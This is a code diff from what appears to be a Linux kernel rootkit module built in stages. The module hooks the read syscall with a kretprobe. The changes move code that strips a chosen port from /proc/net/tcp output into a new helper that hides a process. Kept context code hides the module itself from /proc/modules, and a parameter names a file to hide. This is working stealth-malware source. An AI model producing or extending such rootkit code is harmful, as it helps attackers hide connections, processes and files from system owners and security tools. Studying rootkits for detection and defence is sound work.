@@ -24,6 +24,7 @@
 
 #include "helpers.h"
 #include "step1.h"
+#include "step2.h"
 
 static char* hide_file_name = "FILE";
 module_param(hide_file_name, charp, S_IRWXU);
@@ -138,49 +139,16 @@ static int read_handle_return(struct kretprobe_instance *ri, struct pt_regs *reg
     if(buffer_count == 0)
         return 0;
 
+    ssize_t new_size_step2 = step2_hide_pid(sb->s_id, path, args->buffer_ptr, buffer_count, port_to_hide);
+
+    if(new_size_step2 != -1){
+        regs_set_return_value(regs, new_size_step2);
+        return 0;
+    }
 
     // intercepting only /proc/net/tcp or /proc/pid/net/tcp
     if(strcmp(sb->s_id, "proc") == 0){
-        if(ends_with(path, "/net/tcp")){
-            char* row_start = args->buffer_ptr;
-            int new_length = 0;
-            for(int row = 0; *row_start != '\0' ; row++){
-                int row_length = 0;
-
-                // go to end of line
-                while(*(row_start + row_length) != '\n') ++row_length;
-                // skip \n
-                ++row_length;
-
-                if(row == 0){
-                    // "Skip" first row
-                    new_length += row_length;
-                } else {
-                    int index = -1;
-                    unsigned long address = -1;
-                    unsigned short port = -1;
-
-                    int result = sscanf(row_start, "%d: %lX:%hX", &index, &address, &port);
-
-                    if(result == 3){
-                        // writes line sequentially except line to hide,
-                        // so when line needs to be hidden it will be overriden or ignore with the new length
-                        if(port != port_to_hide){
-                            strncpy(args->buffer_ptr + new_length, row_start, row_length);
-                            new_length += row_length;
-                        }
-                    } else{
-                        pr_warn("Cant Parse line \n");
-                        new_length += row_length;
-                    }
-                }
-                row_start += row_length;
-            }
-
-            // read syscall returns the number of bytes it read
-            regs_set_return_value(regs, new_length);
-        }
-        else if(strcmp(path, "/modules") == 0){
+        if(strcmp(path, "/modules") == 0){
             int module_name_len = strlen(KBUILD_MODNAME);
 
             char* delete_from_ptr = NULL;
